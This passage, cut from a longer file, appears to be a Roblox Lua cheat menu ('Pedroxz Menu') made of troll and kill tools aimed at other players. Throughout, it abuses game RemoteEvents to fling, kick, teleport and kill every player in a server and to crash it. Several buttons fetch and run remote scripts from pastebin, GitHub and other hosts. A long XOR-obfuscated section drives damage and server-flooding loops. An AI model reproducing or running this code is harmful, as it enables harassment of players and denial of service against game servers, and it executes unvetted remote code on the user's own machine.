	return Found 
end
 
local function notif(str,dur)
	game:FindService("StarterGui"):SetCore("SendNotification", {
		Title = "Fling Player Carregado!",
		Text = str,
		Icon = "rbxassetid://2005276185",
		Duration = dur or 3
	})
end
 
--// sds
 
local h = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local Top = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")
 
h.Name = "h"
h.Parent = game:GetService("CoreGui")
h.ResetOnSpawn = false
 
Main.Name = "Main"
Main.Parent = h
Main.Active = true
Main.Draggable = true
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
Main.Size = UDim2.new(0, 454, 0, 218)
Main.Image = "rbxassetid://2005276185"
 
Top.Name = "Top"
Top.Parent = Main
Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
Top.BorderSizePixel = 0
Top.Size = UDim2.new(0, 454, 0, 44)
 
Title.Name = "Title"
Title.Parent = Top
Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0, 0, 0.295454562, 0)
Title.Size = UDim2.new(0, 454, 0, 30)
Title.Font = Enum.Font.SourceSans
Title.Text = "Fling Players Troll (Pedroxz Menu)"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true
 
TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
TextBox.Size = UDim2.new(0, 388, 0, 62)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "Nome do player aqui!"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
 
TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
TextButton.Size = UDim2.new(0, 359, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Cheese em'"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
 
TextButton.MouseButton1Click:Connect(function()
	local Target = gplr(TextBox.Text)
	if Target[1] then
		Target = Target[1]
 
		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
		Thrust.Force = Vector3.new(9999,9999,9999)
		Thrust.Name = "YeetForce"
		repeat
			lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
			Thrust.Location = Target.Character.HumanoidRootPart.Position
			game:FindService("RunService").Heartbeat:wait()
		until not Target.Character:FindFirstChild("Head")
	else
		notif("Invalid player")
	end
end)
 
--//fsddfsdf
notif("Fling carregado, use com sabedoria! By: Pedroxz (nao sei quem fez ent vai ficar assim)", 5)
	  end   
})
    TrollTab:AddButton({
        Name = "Hub Player",
        Callback = function()
            loadstring(game:HttpGet("https://pastebin.com/raw/eUwg0n1f"))()
          end   
        })
    TrollTab:AddButton({
        Name = "Change Value",
        Callback = function()
			local Main = loadstring(game:HttpGet('https://raw.githubusercontent.com/Zv-yz/RBXScripts/master/Scripts/ViethinChange.lua'))()
local Config = {
    BoolValue = true; -- Que seja true ou false
    StringValue = 'Pedroxz Menu E o Hype'; -- A string você deseja
    NumberValue = 9999999999999999999999999; -- Valor do número
    IntValue = 9999999999999999999999999; -- Valor do número
}
Main:Change(Config)
		end
		})
    TrollTab:AddButton({
        Name = "Crashar server (!)",
        Callback = function()
            loadstring(game:HttpGet('https://bifao.tech/scripts/ilhabela.lol'))()
          end   
        })
TrollTab:AddButton({
	Name = "IntValueNumber",
	Callback = function()
        local Evt_R = game:service('ReplicatedStorage')["ACS_Engine"].Events:FindFirstChild("Refil")
		local Quant = -99999999999999000999
	
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("IntValue") or v:IsA("NumberValue") then
				Evt_R:FireServer(v,-(Quant-v.Value))
			end
		end
  	end    
})
local Section = PlayersTab:AddSection({
	Name = "Cheat"
})
PlayersTab:AddButton({
	Name = "Tp Player Proximo",
	Callback = function()
		local p = game.Players.LocalPlayer

local function teleportToClosestPlayer()
    local c = nil
    local d = math.huge
    
    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr ~= p then
            local dist = (plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")) and
                             (p.Character and p.Character:FindFirstChild("HumanoidRootPart")) and
                             (plr.Character.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude or math.huge
            
            if dist < d then
                d = dist
                c = plr
            end
        end
    end
    
    if c then
        p.Character:MoveTo(c.Character.HumanoidRootPart.Position)
    end
end

teleportToClosestPlayer()
	end
})
PlayersTab:AddButton({
	Name = "Kick All - Expulsar (!)",
	Callback = function()
		gabbum = game:GetService'ReplicatedStorage'.DeleteCar
for i, escravo in pairs(game:GetService'Players':GetPlayers()) do
if escravo ~= game:GetService'Players'.LocalPlayer then
gabbum:FireServer(escravo)
end
end
		end
        })
local Section = TrollTab:AddSection({
	Name = "Pedroxz Menu Exclusive Options Troll"
})
    TrollTab:AddButton({
        Name = "Puxar Geral Bypass (!)",
        Callback = function()
            loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/BRING%20ALL%20-%20EB'S"),true))()
          end  
})
    TrollTab:AddButton({
        Name = "Puxar Geral (Cliente) (!)",
        Callback = function()
            local function callback(Text)
			end
			 
			local NotificationBindable = Instance.new("BindableFunction")
			NotificationBindable.OnInvoke = callback
			 
			game.StarterGui:SetCore("SendNotification", {
				Title = "Carregado! by: pedroxz63";
				Text = "Aperte X para puxar geral (cliente) para matar com arma.";
				Duration = "5";
				Callback = NotificationBindable;
			})
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer
			
			local function pullAllPlayers()
				local character = player.Character or player.CharacterAdded:Wait()
				local hrp = character:WaitForChild("HumanoidRootPart")
				
				for _, otherPlayer in pairs(Players:GetPlayers()) do
					if otherPlayer ~= player then
						local otherCharacter = otherPlayer.Character
						if otherCharacter then
							local otherHRP = otherCharacter:FindFirstChild("HumanoidRootPart")
							if otherHRP then
								otherHRP.CFrame = hrp.CFrame
							end
						end
					end
				end
			end
			
			game:GetService("UserInputService").InputBegan:Connect(function(input, isProcessed)
				if isProcessed then return end
				if input.KeyCode == Enum.KeyCode.X then
					pullAllPlayers()
				end
			end)
          end  
})
    KillTab:AddButton({
        Name = "Kill All Foguete PVP (Loop)",
        Callback = function()
            local player = game.Players.LocalPlayer
local event = game.ReplicatedStorage.WeaponsSystem.Network.WeaponHit
local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")

if not tool then
    for i, v in pairs(player.Backpack:GetChildren()) do
        if v:IsA("Tool") and v:FindFirstChild("Configuration") then
            tool = v
            break
        end
    end
end

local function damage(hum, head, thr)
    pcall(event.FireServer, event, tool, {
        ["p"] = Vector3.new(),
        ["pid"] = 1,
        ["part"] = head,
        ["d"] = 10,
        ["maxDist"] = 10.5,
        ["h"] = hum,
        ["m"] = Enum.Material.Plastic,
        ["n"] = Vector3.new(),
        ["t"] = 0.5,
        ["sid"] = 1
    })

    coroutine.resume(thr, hum.Parent)
end

local function executeScript()
    for i, v in pairs(game.Players:GetPlayers()) do
        local character = v.Character
        local head = character and character:FindFirstChild("Head")
        local hum = character and character:FindFirstChild("Humanoid")

        if v.Team == game.Teams.lobby then
            continue
        end

        if head and hum and hum.Health > 0 and v ~= player then
            for i = 1, hum.Health / tool.Configuration.HitDamage.Value + 1 do
                task.spawn(damage, hum, head, coroutine.running())
            end
        end
    end
end

while true do
    wait(1) 
    executeScript()
end
          end  
        })
    PlayersTab:AddButton({
        Name = "Acs Hub (!)",
        Callback = function()
            local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
bit32 = {};
local N = 32;
local P = 2 ^ N;
bit32.bnot = function(x)
	x = x % P;
	return (P - 1) - x;
end;
bit32.band = function(x, y)
	if (y == 255) then
		return x % 256;
	end
	if (y == 65535) then
		return x % 65536;
	end
	if (y == 4294967295) then
		return x % 4294967296;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) == 2) then
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bor = function(x, y)
	if (y == 255) then
		return (x - (x % 256)) + 255;
	end
	if (y == 65535) then
		return (x - (x % 65536)) + 65535;
	end
	if (y == 4294967295) then
		return 4294967295;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) >= 1) then
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bxor = function(x, y)
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) == 1) then
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.lshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount < 0) then
		return math.floor(x * (2 ^ s_amount));
	else
		return (x * (2 ^ s_amount)) % P;
	end
end;
bit32.rshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		return math.floor(x * (2 ^ -s_amount));
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
bit32.arshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		local add = 0;
		if (x >= (P / 2)) then
			add = P - (2 ^ (N - s_amount));
		end
		return math.floor(x * (2 ^ -s_amount)) + add;
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
local v0 = "https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/";
local v1 = loadstring(game:HttpGet(v0 .. LUAOBFUSACTOR_DECRYPT_STR_0("\253\202\217\55\231\169\222\80\221\214\218", "\126\177\163\187\69\134\219\167")))();
local v2 = loadstring(game:HttpGet(v0 .. "addons/ThemeManager.lua"))();
local v3 = loadstring(game:HttpGet(v0 .. "addons/SaveManager.lua"))();
local v4 = game.ReplicatedStorage:FindFirstChildOfClass(LUAOBFUSACTOR_DECRYPT_STR_0("\0\194\36\195\245\36\216\56\196\232\42\194\36", "\156\67\173\74\165"));
if not v4 then
	v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\51\182\68\19\252\40\73\32\247\65\23\170\35\6\21\148\122", "\38\84\215\41\118\220\70"), 3);
	return;
else
	v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\67\3\33\17\251\67\5\98\21\255\93\19\98\26\255\70\19\98\51\221\99", "\158\48\118\66\114"), 3);
end
local v5 = v4.Events;
local v6 = game.Players.LocalPlayer;
local v7 = v6.Character;
local v8 = v1:CreateWindow({[LUAOBFUSACTOR_DECRYPT_STR_0("\159\45\4\58\118", "\155\203\68\112\86\19\197")]=LUAOBFUSACTOR_DECRYPT_STR_0("\110\232\20", "\152\38\189\86\156\32\24\133"),[LUAOBFUSACTOR_DECRYPT_STR_0("\223\82\169\82\249\69", "\38\156\55\199")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\137\104\104\39\32\124\245\84", "\35\200\29\28\72\115\20\154")]=true});
local v9 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\52\190\216\209", "\84\121\223\177\191\237\76")]=v8:AddTab(LUAOBFUSACTOR_DECRYPT_STR_0("\150\87\192\174", "\161\219\54\169\192\90\48\80")),[LUAOBFUSACTOR_DECRYPT_STR_0("\127\75\19\48\72\78", "\69\41\34\96")]=v8:AddTab(LUAOBFUSACTOR_DECRYPT_STR_0("\138\202\196\31\3\39", "\75\220\163\183\106\98")),[LUAOBFUSACTOR_DECRYPT_STR_0("\55\147\203\4\220\22\174\130\57\222\17", "\185\98\218\235\87")]=v8:AddTab(LUAOBFUSACTOR_DECRYPT_STR_0("\254\21\103\213\219\190\223\53\41\225\205", "\202\171\92\71\134\190"))};
local v10 = v9.Main:AddLeftGroupbox(LUAOBFUSACTOR_DECRYPT_STR_0("\15\196\45\156\60\211\41\155", "\232\73\161\76"));
local v11 = v9.Visual:AddLeftGroupbox(LUAOBFUSACTOR_DECRYPT_STR_0("\141\208\81\72\31\183", "\126\219\185\34\61"));
local v12 = v9.Main:AddLeftGroupbox(LUAOBFUSACTOR_DECRYPT_STR_0("\32\193\93\115\114\71\255\230\21\203\76", "\135\108\174\62\18\30\23\147"));
local v13 = v9.Main:AddRightGroupbox(LUAOBFUSACTOR_DECRYPT_STR_0("\148\251\47\202\27\166", "\167\214\137\74\171\120\206\83"));
v1:SetWatermarkVisibility(true);
local v14 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\170\227\33\88\236\148\142\226\36\84\251\162", "\199\235\144\82\61\152")):GetGamePlacesAsync();
local v15;
for v19, v20 in v14:GetCurrentPage() do
	v15 = v20.Name;
end
v1:SetWatermark(v15 .. LUAOBFUSACTOR_DECRYPT_STR_0("\71\10\249", "\75\103\118\217") .. game.PlaceId .. LUAOBFUSACTOR_DECRYPT_STR_0("\135\72\48", "\126\167\52\16\116\217") .. require(v4.GameRules.Config).Version);
v10:AddInput(LUAOBFUSACTOR_DECRYPT_STR_0("\222\47\44\149\177", "\156\168\78\64\224\212\121"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\41\251\168\203\21\231\166", "\174\103\142\197")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\112\33\81\49\54\86\253\82", "\152\54\72\63\88\69\62")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\224\193\246\72", "\60\180\164\142")]=LUAOBFUSACTOR_DECRYPT_STR_0("\110\95\9\60\34", "\114\56\62\101\73\71\141"),[LUAOBFUSACTOR_DECRYPT_STR_0("\140\230\212\200\172\224\203", "\164\216\137\187")]=LUAOBFUSACTOR_DECRYPT_STR_0("\228\231\61\167\163", "\107\178\134\81\210\198\158"),[LUAOBFUSACTOR_DECRYPT_STR_0("\8\2\131\197\175\48\1\142\194\175\42", "\202\88\110\226\166")]=LUAOBFUSACTOR_DECRYPT_STR_0("\234\1\145\242\216\215\79\148\246\198\214\10", "\170\163\111\226\151")});
v10:AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\37\41\162\61", "\73\113\80\210\88\46\87"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\183\45\193\7\226\146", "\135\225\76\173\114")]={LUAOBFUSACTOR_DECRYPT_STR_0("\51\227\172\134\173\177\178\31", "\199\122\141\216\208\204\221"),LUAOBFUSACTOR_DECRYPT_STR_0("\131\200\29\242\125\228\155\220\28\229\125", "\150\205\189\112\144\24")},[LUAOBFUSACTOR_DECRYPT_STR_0("\1\129\185\77\17\132\5", "\112\69\228\223\44\100\232\113")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\249\10\11\199\191", "\230\180\127\103\179\214\28")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\184\0\71\82", "\128\236\101\63\38\132\33")]=LUAOBFUSACTOR_DECRYPT_STR_0("\159\172\29\65\181\255\143\184\176\1\65\246\253\206\160\188\20", "\175\204\201\113\36\214\139"),[LUAOBFUSACTOR_DECRYPT_STR_0("\115\195\58\208\16\78\220", "\100\39\172\85\188")]=LUAOBFUSACTOR_DECRYPT_STR_0("\190\125\181\133\48\185\56\175\129\63\184\125\249\148\42\189\125", "\83\205\24\217\224")});
Options.value:OnChanged(function(v22)
	getgenv().Value = v22;
end);
v10:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\197\205\204\51\225\192", "\93\134\165\173"), function()
	for v72, v73 in game:GetDescendants() do
		if v73:IsA(Options.Type.Value) then
			task.spawn(v5.Refil.FireServer, v5.Refil, v73, -(getgenv().Value or (1 - v73.Value)));
		end
	end
end);
local v16 = {};
for v24, v25 in game.Players:GetPlayers() do
	if (v25 == v6) then
		continue;
	end
	table.insert(v16, v25.Name);
end
v10:AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\142\254\192\219\63\220\161", "\30\222\146\161\162\90\174\210"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\211\79\124\31\224\93", "\106\133\46\16")]=v16,[LUAOBFUSACTOR_DECRYPT_STR_0("\124\37\117\253\79\76\76", "\32\56\64\19\156\58")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\119\221\233\66\83", "\224\58\168\133\54\58\146")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\109\83\83\233", "\107\57\54\43\157\21\230\231")]=LUAOBFUSACTOR_DECRYPT_STR_0("\235\135\16\236\188\206\220", "\175\187\235\113\149\217\188"),[LUAOBFUSACTOR_DECRYPT_STR_0("\8\160\142\64\247\112\104", "\24\92\207\225\44\131\25")]=LUAOBFUSACTOR_DECRYPT_STR_0("\88\214\180\73\24\105\11\195\180\77\2\120\89", "\29\43\179\216\44\123")});
Options.Players:OnChanged(function()
	for v74, v75 in Options.Players.Value do
		getgenv().kill = v74;
	end
end);
v10:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\153\216\45\77\186\220", "\44\221\185\64"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\53\226\80\75", "\19\97\135\40\63")]=LUAOBFUSACTOR_DECRYPT_STR_0("\138\93\62\58\40\52\238\83\61\123\63\61\175\69\54\41", "\81\206\60\83\91\79"),[LUAOBFUSACTOR_DECRYPT_STR_0("\106\174\214\115\58\207\89", "\196\46\203\176\18\79\163\45")]=100,[LUAOBFUSACTOR_DECRYPT_STR_0("\149\43\112", "\143\216\66\30\126\68\155")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\135\201\21", "\129\202\168\109\171\165\195\183")]=200,[LUAOBFUSACTOR_DECRYPT_STR_0("\16\87\34\214\218\29\232\37", "\134\66\56\87\184\190\116")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\31\62\4\171\24\232\53", "\85\92\81\105\219\121\139\65")]=false});
Options.Damage:OnChanged(function()
	getgenv().Damage = Options.Damage.Value;
end);
v10:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\214\186\92\73\60\207\241\178\73\64\110", "\191\157\211\48\37\28"), function()
	local v28 = v5.AcessId:InvokeServer(v6.UserId) .. "-" .. v6.UserId;
	local v29, v30 = v6.Character:FindFirstChildOfClass(LUAOBFUSACTOR_DECRYPT_STR_0("\235\16\251\16", "\90\191\127\148\124"));
	if (v29 and v29:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\89\164\29\40\75\130\58\3\113\137\41\4", "\119\24\231\78"))) then
		v30 = require(v29.ACS_Settings);
	else
		for v90, v91 in game:GetDescendants() do
			if (v91:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\182\34\170\70", "\113\226\77\197\42\188\32")) and v91:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\27\53\199\138\9\19\224\161\51\24\243\166", "\213\90\118\148"))) then
				v29, v30 = v91, require(v91.ACS_Settings);
				break;
			end
		end
	end
	local v31 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\86\39\186\114\76\86\47\179\83\96\84\42", "\45\59\78\212\54")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\52\87\142\138\129\43\128\255\20", "\144\112\54\227\235\230\78\205")]=getgenv().Damage};
	local v32 = game.Players:FindFirstChild(getgenv().kill);
	local v33 = v32.Character and v32.Character:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\155\61\2\253\222\84\186\44", "\59\211\72\111\156\176"));
	if not v33 then
		return;
	end
	task.spawn(v5.Damage.InvokeServer, v5.Damage, v29, v33, 1, 1, v30, v31, nil, nil, v28);
	v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\69\142\239\33\75\131\163\57\70\130\163\61\66\134\250\40\92\199", "\77\46\231\131") .. v32.Name, 3);
end);
v10:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\145\93\186\76\250\85\186\76", "\32\218\52\214"), function()
	local v34 = v5.AcessId:InvokeServer(v6.UserId) .. "-" .. v6.UserId;
	local v35, v36 = v6.Character:FindFirstChildOfClass(LUAOBFUSACTOR_DECRYPT_STR_0("\122\24\62\164", "\58\46\119\81\200\145\208\37"));
	if (v35 and v35:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\10\175\3\147\154\184\34\63\133\62\171\186", "\86\75\236\80\204\201\221"))) then
		v36 = require(v35.ACS_Settings);
	else
		for v92, v93 in game:GetDescendants() do
			if (v93:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\70\78\120\137", "\235\18\33\23\229\158")) and v93:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\113\153\242\132\99\191\213\175\89\180\198\168", "\219\48\218\161"))) then
				v35, v36 = v93, require(v93.ACS_Settings);
				break;
			end
		end
	end
	local v37 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\233\120\114\109\218\66\225\227\116\81\70\223", "\128\132\17\28\41\187\47")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\37\51\11\59\90\4\31\9\62", "\61\97\82\102\90")]=getgenv().Damage};
	for v77, v78 in game.Players:GetPlayers() do
		local v79 = v78.Character and v78.Character:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\132\59\166\74\201\88\23\13", "\105\204\78\203\43\167\55\126"));
		if ((v78 ~= v6) and v79) then
			task.spawn(v5.Damage.InvokeServer, v5.Damage, v35, v79, 1, 1, v36, v37, nil, nil, v34);
			v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\174\163\47\18\22\0\135\69\173\175\99\14\31\5\222\84\183\234", "\49\197\202\67\126\115\100\167") .. v78.Name, 3);
		end
	end
end);
v10:AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\32\83\214\51\154", "\62\87\59\191\73\224\54"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\211\7\226\221", "\169\135\98\154")]=LUAOBFUSACTOR_DECRYPT_STR_0("\252\127\45\78\231\115\219\206\101\50\81\239", "\168\171\23\68\52\157\83"),[LUAOBFUSACTOR_DECRYPT_STR_0("\208\116\243\172\48\33\147", "\231\148\17\149\205\69\77")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\180\168\200\247\67\246\144", "\159\224\199\167\155\55")]=LUAOBFUSACTOR_DECRYPT_STR_0("\196\252\41\220\243\179\47\215\229\229\57\192", "\178\151\147\92")});
Toggles.whizz:OnChanged(function()
	while Toggles.whizz.Value do
		for v84, v85 in game.Players:GetPlayers() do
			task.spawn(v5.Whizz.FireServer, v5.Whizz, v85);
		end
		task.wait();
	end
end);
v10:AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\191\232\92\34\0\73\105\159\244\67\60", "\26\236\157\44\82\114\44"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\30\43\205\79", "\59\74\78\181")]=LUAOBFUSACTOR_DECRYPT_STR_0("\22\196\74\74\161\32\194\73\83\188\43\145\73\95\161\51\212\72", "\211\69\177\58\58"),[LUAOBFUSACTOR_DECRYPT_STR_0("\147\224\127\244\252\199\163", "\171\215\133\25\149\137")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\213\199\61\246\251\57\236", "\34\129\168\82\154\143\80\156")]=LUAOBFUSACTOR_DECRYPT_STR_0("\182\189\38\5\76\14\154\128\160\37\14\90", "\233\229\210\83\107\40\46")});
Toggles.Suppression:OnChanged(function()
	while Toggles.Suppression.Value do
		for v86, v87 in game.Players:GetPlayers() do
			task.spawn(v5.Suppression.FireServer, v5.Suppression, v87, 1, math.huge, math.huge);
		end
		task.wait();
	end
end);
v10:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\210\86\32\211\11\198\86\58", "\101\161\34\82\182"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\220\8\65\234", "\78\136\109\57\158\187\130\226")]=LUAOBFUSACTOR_DECRYPT_STR_0("\29\45\248\226\54\127\234\229\44\58\247\246\42\55", "\145\94\95\153"),[LUAOBFUSACTOR_DECRYPT_STR_0("\217\200\18\212\91\187\233", "\215\157\173\116\181\46")]=30,[LUAOBFUSACTOR_DECRYPT_STR_0("\24\189\133", "\186\85\212\235\146")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\239\128\14", "\56\162\225\118\158\89\142")]=100,[LUAOBFUSACTOR_DECRYPT_STR_0("\110\10\213\161\38\209\82\2", "\184\60\101\160\207\66")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\18\141\113\172\48\129\104", "\220\81\226\28")]=false});
Options.strength:OnChanged(function()
	getgenv().strength = Options.strength.Value;
end);
v10:AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\17\192\142\247\239\211", "\167\115\181\226\155\138"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\214\39\255\72", "\166\130\66\135\60\27\17")]=LUAOBFUSACTOR_DECRYPT_STR_0("\103\88\207\102\56\4\89\203\103\38\65\88\142\115\57\86\89\218\53\61\65\94\198\122\52", "\80\36\42\174\21"),[LUAOBFUSACTOR_DECRYPT_STR_0("\106\21\49\123\91\28\35", "\26\46\112\87")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\141\44\164\120\171\182\85", "\212\217\67\203\20\223\223\37")]=LUAOBFUSACTOR_DECRYPT_STR_0("\185\159\169\193\178\205\188\218\179\158\232\193\191\159\190\215\168\193\232\199\169\132\166\213\250\158\173\192\172\136\186\146\184\152\164\222\191\153", "\178\218\237\200")});
Toggles.bullet:OnChanged(function()
	while Toggles.bullet.Value do
		for v88 = 1, getgenv().strength or 20 do
			v5.ServerBullet:FireServer(Vector3.new(0/0/0), Vector3.new(0/0/0));
		end
		task.wait();
	end
end);
v10:AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\179\164\243\217\166", "\176\214\213\134"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\192\168\174\192", "\57\148\205\214\180\200\54")]=LUAOBFUSACTOR_DECRYPT_STR_0("\49\239\52\39\126\82\238\48\38\96\23\239\117\39\115\17\242\59\48\54\31\248\33\60\121\22", "\22\114\157\85\84"),[LUAOBFUSACTOR_DECRYPT_STR_0("\224\206\21\197\72\250\188", "\200\164\171\115\164\61\150")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\138\251\12\73\151\183\228", "\227\222\148\99\37")]=LUAOBFUSACTOR_DECRYPT_STR_0("\48\64\83\229\241\115\70\90\255\234\115\65\87\228\239\54\64\30\182\236\32\91\92\241\185\108\13\13\169\166\108", "\153\83\50\50\150")});
Toggles.equip:OnChanged(function()
	local v40 = v6.Character:FindFirstChildOfClass(LUAOBFUSACTOR_DECRYPT_STR_0("\105\121\124\16", "\45\61\22\19\124\19\203"));
	if not v40 then
		for v94, v95 in game:GetDescendants() do
			if (v95:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\245\29\2\249", "\217\161\114\109\149\98\16")) and v95:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\51\3\11\67\143\113\6\52\49\114\187\103", "\20\114\64\88\28\220"))) then
				v40 = v95;
				break;
			end
		end
	end
	while Toggles.equip.Value do
		for v89 = 1, getgenv().strength or 20 do
			v5.Equip:FireServer(v40, 1);
		end
		task.wait();
	end
end);
v12:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\6\0\222\191\203\192\184\52\5", "\221\81\97\178\212\152\176"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\249\226\5\239", "\122\173\135\125\155")]=LUAOBFUSACTOR_DECRYPT_STR_0("\170\206\18\180\62\61\136\179\192\12\178\12\33\205\129\197", "\168\228\161\96\217\95\81"),[LUAOBFUSACTOR_DECRYPT_STR_0("\255\212\40\93\58\91\207", "\55\187\177\78\60\79")]=require(v4.GameRules.Config).NormalWalkSpeed,[LUAOBFUSACTOR_DECRYPT_STR_0("\0\199\81", "\224\77\174\63\139\38\175")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\169\64\64", "\78\228\33\56")]=500,[LUAOBFUSACTOR_DECRYPT_STR_0("\252\113\167\13\129\199\112\181", "\229\174\30\210\99")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\56\226\139\65\236\62\45", "\89\123\141\230\49\141\93")]=false});
Options.WalkSpeed:OnChanged(function()
	require(v4.GameRules.Config).NormalWalkSpeed = Options.WalkSpeed.Value;
end);
